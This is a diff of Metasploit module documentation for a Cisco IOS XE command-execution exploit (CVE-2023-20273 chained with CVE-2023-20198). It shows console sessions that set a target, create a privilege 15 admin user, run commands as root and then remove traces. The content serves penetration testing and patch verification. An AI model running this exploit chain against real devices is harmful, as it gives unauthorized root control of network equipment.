@@ -89,21 +89,22 @@ can be locked preventing deleting upon the first attempt, so the module will try
 ## Scenarios
 
 ```
-msf6 > use auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set RHOST 192.168.86.57
-RHOST => 192.168.86.57
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set CMD "id"
-CMD => id
 msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > show options
 
 Module options (auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273):
 
    Name                   Current Setting  Required  Description
    ----                   ---------------  --------  -----------
+   CISCO_ADMIN_PASSWORD                    no        The password of an admin account. If not set, CVE-2023-20198 is leveraged to c
+                                                     reate a new admin password.
+   CISCO_ADMIN_USERNAME                    no        The username of an admin account. If not set, CVE-2023-20198 is leveraged to c
+                                                     reate a new admin account.
    CMD                    id               yes       The OS command to execute.
    Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
-   REMOVE_OUTPUT_TIMEOUT  30               yes       The maximum timeout (in seconds) to wait when trying to removing the commands output file.
-   RHOSTS                 192.168.86.57    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   REMOVE_OUTPUT_TIMEOUT  30               yes       The maximum timeout (in seconds) to wait when trying to removing the commands
+                                                     output file.
+   RHOSTS                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
+                                                     cs/using-metasploit.html
    RPORT                  443              yes       The target port (TCP)
    SSL                    true             no        Negotiate SSL/TLS for outgoing connections
    VHOST                                   no        HTTP server virtual host
@@ -111,28 +112,19 @@ Module options (auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273):
 
 View the full module info with the info, or info -d command.
 
+msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set rhosts 10.5.135.193
+rhosts => 10.5.135.193
+msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set verbose true
+verbose => true
 msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > run
-[*] Running module against 192.168.86.57
+[*] Running module against 10.5.135.193
 
-[*] uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:polaris_nginx_t:s0
+[*] Created privilege 15 user 'rfojGrqA' with password 'ixnXyFlw'
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:polaris_nginx_t:s0
 
+[*] Removing output file '/var/www/fNrmuBOf'
+[*] Removing user 'rfojGrqA'
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > run CMD="uname -a"
-[*] Running module against 192.168.86.57
 
-[*] Linux router 4.19.64 #1 SMP Wed Dec 11 10:30:30 PST 2019 x86_64 x86_64 x86_64 GNU/Linux
-
-[*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) >  run CMD="cat /etc/release"
-[*] Running module against 192.168.86.57
-
-[*] # Needed for open-vm-tools
-# Copyright (c) 2016 by Cisco Systems, Inc., All rights reserved.
-DISTRIB_ID=Cisco
-DISTRIB_RELEASE=3.10.84
-DISTRIB_CODENAME=IOS-XE
-DISTRIB_DESCRIPTION="Monte Vista Linux"
-
-[*] Auxiliary module execution completed
 msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > 
 ```
